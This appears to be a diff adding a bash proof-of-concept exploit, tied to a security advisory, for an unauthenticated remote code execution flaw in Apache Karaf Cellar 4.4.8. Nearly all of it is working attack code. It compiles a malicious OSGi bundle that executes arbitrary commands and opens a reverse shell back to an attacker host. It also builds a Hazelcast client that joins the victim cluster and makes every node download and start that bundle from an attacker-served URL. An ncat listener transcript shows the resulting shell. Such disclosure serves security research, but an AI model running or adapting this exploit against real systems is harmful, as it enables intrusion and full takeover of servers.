@@ -1,0 +1,188 @@
+#!/usr/bin/env bash
+#
+#
+# Apache Karaf Cellar 4.4.8 Remote Code Execution
+#
+#
+# Vendor: The Apache Software Foundation
+# Product web page: https://karaf.apache.org
+# Affected version: 4.4.8
+#
+# Summary: Apache Karaf Cellar is a complete clustering solution
+# for Apache Karaf Container. Cellar can be directly installed on
+# running Karaf Container instances.
+#
+# Desc: Apache Karaf Cellar suffers from an unauthenticated cluster-join
+# vulnerability leading to remote code execution. The default hazelcast.xml
+# enables multicast discovery and relies on a group password that
+# Hazelcast no longer treats as an authentication control, so a network-adjacent
+# attacker can join the cluster and publish to Cellar's distributed maps.
+# Through the bundle event handler this causes the target nodes to
+# install and start a bundle from an attacker-supplied URL, resulting
+# in cross-node remote code execution. The default group policy permits
+# this (bundle whitelist inbound "*", blacklist only "*.xml"), so any
+# .jar URL is accepted.
+#
+# ---------------------------------------------------------------------
+# > ncat -lv 8888
+# Ncat: Version 7.95 ( https://nmap.org/ncat )
+# Ncat: Listening on [::]:8888
+# Ncat: Listening on 0.0.0.0:8888
+# Ncat: Connection from 192.168.1.8:10094.
+# id
+#
+# uid=997(karaf) gid=997(karaf) groups=997(karaf)
+# ^C
+# > 
+# ---------------------------------------------------------------------
+#
+# Tested on: Microsoft Windows 10
+#            Apache Felix 7.0.5 OSGi
+#            OpenJDK Temurin 21.0.6
+#            Hazelcast 3.12.13
+#            Python 3
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2026-6033
+# Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6033
+#
+#
+# 13.08.2026
+#
+
+
+set -u
+VICTIM="${VICTIM:-127.0.0.1:5701}"; LHOST="${LHOST:-127.0.0.1}"; HTTP_PORT="${HTTP_PORT:-8000}"
+CMD="${CMD:-id; hostname}"; RHOST="${RHOST:-}"; RPORT="${RPORT:-}"; MODE="${MODE:-tcpip}"
+CELLAR_GROUP="${CELLAR_GROUP:-default}"; HAZEL_GROUP="${HAZEL_GROUP:-cellar}"; BUILD_ONLY="${BUILD_ONLY:-0}"; SERVE_AFTER="${SERVE_AFTER:-20}"
+case "$(uname -s)" in MINGW*|MSYS*|CYGWIN*) SEP=";"; jp(){ cygpath -w "$1"; } ;; *) SEP=":"; jp(){ printf '%s' "$1"; } ;; esac
+command -v javac >/dev/null || { echo "[!] Need a JDK (javac/jar/java)"; exit 1; }
+PY="$(command -v python3 || command -v python)"; [ -n "$PY" ] || { echo "[!] Need python3"; exit 1; }
+
+GO_KARAF=$(cat << 'EOF'
+
+  _                    __ ___          _ _            
+ | |                  / _|__ \        | | |           
+ | | ____ _ _ __ __ _| |_   ) |___ ___| | | __ _ _ __ 
+ | |/ / _` | '__/ _` |  _| / // __/ _ \ | |/ _` | '__|
+ |   < (_| | | | (_| | |  / /| (_|  __/ | | (_| | |   
+ |_|\_\__,_|_|  \__,_|_| |____\___\___|_|_|\__,_|_|  v2.5.1
+
+
+EOF
+)
+
+W="$(mktemp -d 2>/dev/null || echo "./cellar_rce_build.$$")"; mkdir -p "$W/lib" "$W/bundle/evil" "$W/web" "$W/src"
+cleanup(){ [ -n "${HTTP_PID:-}" ] && kill "$HTTP_PID" 2>/dev/null; }; trap cleanup EXIT
+
+echo "$GO_KARAF"
+
+M="https://repo1.maven.org/maven2"
+echo "[*] Fetching real Hazelcast 3.12.13 + Cellar 4.4.8 + OSGi ..."
+for j in \
+  "com/hazelcast/hazelcast/3.12.13/hazelcast-3.12.13.jar" \
+  "org/apache/karaf/cellar/org.apache.karaf.cellar.core/4.4.8/org.apache.karaf.cellar.core-4.4.8.jar" \
+  "org/apache/karaf/cellar/org.apache.karaf.cellar.bundle/4.4.8/org.apache.karaf.cellar.bundle-4.4.8.jar" \
+  "org/osgi/org.osgi.core/6.0.0/org.osgi.core-6.0.0.jar" ; do
+  curl -fsSL "$M/$j" -o "$W/lib/$(basename "$j")" || { echo "[!] Download failed: $j"; exit 1; }
+done
+CP=""; for x in "$W"/lib/*.jar; do CP="${CP:+$CP$SEP}$(jp "$x")"; done
+
+cat > "$W/src/EvilActivator.java.tmpl" <<'JAVA_EOF'
+package evil;
+import org.osgi.framework.BundleActivator;
+import org.osgi.framework.BundleContext;
+import java.io.*; import java.net.Socket;
+public class EvilActivator implements BundleActivator {
+    static final String CMD="@CMD@", RHOST="@RHOST@", RPORT="@RPORT@";
+    public void start(final BundleContext ctx){ new Thread(new Runnable(){ public void run(){ pop(); } },"evil-rce").start(); }
+    public void stop(BundleContext ctx){}
+    private void pop(){
+        boolean win=System.getProperty("os.name","").toLowerCase().contains("win");
+        try{
+            File mark=new File(System.getProperty("java.io.tmpdir"),"peend.txt");
+            try(FileWriter w=new FileWriter(mark,true)){ w.write("Cellar RCE: EvilActivator.start() ran on "
+                +java.net.InetAddress.getLocalHost()+" as "+System.getProperty("user.name")+" at "+new java.util.Date()+"\n"); }
+            System.out.println(">>> CELLAR RCE: EvilActivator.start() executed; marker="+mark);
+            if(CMD!=null && CMD.length()>0){
+                ProcessBuilder pb=win?new ProcessBuilder("cmd.exe","/c",CMD):new ProcessBuilder("/bin/sh","-c",CMD);
+                pb.redirectErrorStream(true); Process p=pb.start();
+                BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));
+                for(String l;(l=r.readLine())!=null;) System.out.println("    [cmd] "+l);
+            }
+            if(RHOST!=null && RHOST.length()>0){
+                Socket s=new Socket(RHOST,Integer.parseInt(RPORT));
+                Process p=new ProcessBuilder(win?"cmd.exe":"/bin/sh").redirectErrorStream(true).start();
+                pipe(s.getInputStream(),p.getOutputStream()); pipe(p.getInputStream(),s.getOutputStream());
+            }
+        }catch(Throwable t){ System.out.println(">>> CELLAR RCE payload error: "+t); }
+    }
+    private static void pipe(final InputStream in,final OutputStream out){
+        new Thread(new Runnable(){ public void run(){ try{ byte[] b=new byte[4096]; int n;
+            while((n=in.read(b))>0){ out.write(b,0,n); out.flush(); } }catch(Exception e){} } }).start();
+    }
+}
+JAVA_EOF
+
+cat > "$W/src/Podroom.java" <<'JAVA_EOF'
+import com.hazelcast.config.*; import com.hazelcast.core.*;
+import org.apache.karaf.cellar.core.Group; import org.apache.karaf.cellar.bundle.ClusterBundleEvent;
+import org.osgi.framework.Bundle; import java.util.Arrays;
+public class Podroom {
+    static { System.setProperty("hazelcast.phone.home.enabled","false"); System.setProperty("hazelcast.logging.type","none"); }
+    public static void main(String[] a) throws Exception {
+        String members=a[0], bundleUrl=a[1], cellarGroup=a[2], hazelGroup=a[3], mode=a[4];
+        Config c=new Config(); c.setInstanceName("attacker");
+        c.getGroupConfig().setName(hazelGroup).setPassword("whatever-not-checked");
+        NetworkConfig net=c.getNetworkConfig(); net.setPort(5720).setPortAutoIncrement(true);
+        JoinConfig join=net.getJoin(); join.getMulticastConfig().setEnabled(false);
+        if("multicast".equalsIgnoreCase(mode)){ join.getTcpIpConfig().setEnabled(false);
+            join.getMulticastConfig().setEnabled(true).setMulticastGroup("224.2.2.3").setMulticastPort(54327); }
+        else { join.getTcpIpConfig().setEnabled(true).setMembers(Arrays.asList(members.split(","))); }
+        System.out.println("[*] Joining Hazelcast group '"+hazelGroup+"' ("+mode+") via "+members+" ...");
+        HazelcastInstance hz=Hazelcast.newHazelcastInstance(c); Thread.sleep(3000);
+        System.out.println("[*] Cluster members: "+hz.getCluster().getMembers());
+        ClusterBundleEvent e=new ClusterBundleEvent("evil","1.0.0",bundleUrl,1,Bundle.INSTALLED);
+        e.setSourceGroup(new Group(cellarGroup)); e.setForce(Boolean.TRUE);
+        ITopic<Object> t=hz.getTopic("org.apache.karaf.cellar.event.topic");
+        System.out.println("[*] Publishing ClusterBundleEvent{INSTALLED, location="+bundleUrl+"} ...");
+        t.publish(e); Thread.sleep(2000);
+        System.out.println("[+] Published -> every Cellar node in group '"+cellarGroup+"' installs+starts the bundle = RCE.");
+        hz.shutdown(); System.exit(0);
+    }
+}
+JAVA_EOF
+
+echo "[*] Building the malicious OSGi bundle (evil.jar) ..."
+sed -e "s|@CMD@|$CMD|g" -e "s|@RHOST@|$RHOST|g" -e "s|@RPORT@|$RPORT|g" \
+    "$W/src/EvilActivator.java.tmpl" > "$W/bundle/evil/EvilActivator.java"
+javac -cp "$CP" -d "$W/bundle" "$(jp "$W/bundle/evil/EvilActivator.java")" || { echo "[!] Bundle build failed"; exit 1; }
+printf 'Manifest-Version: 1.0\nBundle-ManifestVersion: 2\nBundle-SymbolicName: evil\nBundle-Version: 1.0.0\nBundle-Activator: evil.EvilActivator\nImport-Package: org.osgi.framework\n' > "$W/bundle/MANIFEST.MF"
+( cd "$W/bundle" && jar cfm "$W/web/evil.jar" MANIFEST.MF evil ) || { echo "[!] jar failed"; exit 1; }
+BURL="http://$LHOST:$HTTP_PORT/evil.jar"
+
+echo "[*] Building the exploit (Podroom) ..."
+javac -cp "$CP" -d "$W" "$(jp "$W/src/Podroom.java")" || { echo "[!] Exploit build failed"; exit 1; }
+
+if [ "$BUILD_ONLY" = "1" ]; then echo "[*] BUILD_ONLY=1 - built OK, not firing. Artifacts in $W"; exit 0; fi
+
+echo "[*] Serving $W/web on 0.0.0.0:$HTTP_PORT ($BURL) ..."
+( cd "$W/web" && "$PY" -m http.server "$HTTP_PORT" >/dev/null 2>&1 ) & HTTP_PID=$!
+sleep 1
+echo "-----------------------------------------------------------------"
+echo "[*] Firing at victim $VICTIM (bundle=$BURL, cellar group=$CELLAR_GROUP, mode=$MODE)"
+[ -n "$RHOST" ] && echo "[*] Reverse shell -> $RHOST:$RPORT  (have 'nc -lvnp $RPORT' ready)"
+echo "-----------------------------------------------------------------"
+java -cp ".${SEP}$(jp "$W")${SEP}$CP" Podroom "$VICTIM" "$BURL" "$CELLAR_GROUP" "$HAZEL_GROUP" "$MODE"
+echo "-----------------------------------------------------------------"
+echo "[*] Keeping the bundle server up ${SERVE_AFTER}s so every victim can fetch evil.jar ..."
+echo "    (victims install the bundle ASYNCHRONOUSLY after receiving the event; if the server dies first"
+echo "     they fail with 'Unable to cache bundle'. Raise SERVE_AFTER for slow/many nodes.)"
+sleep "$SERVE_AFTER"
+echo "[*] Done. Each victim node ran installBundle+start on evil.jar -> EvilActivator.start()."
+echo "    Proof marker on victims: <java.io.tmpdir>/peend.txt"
+[ -n "$RHOST" ] && echo "    Reverse shell should have connected back to $RHOST:$RPORT."
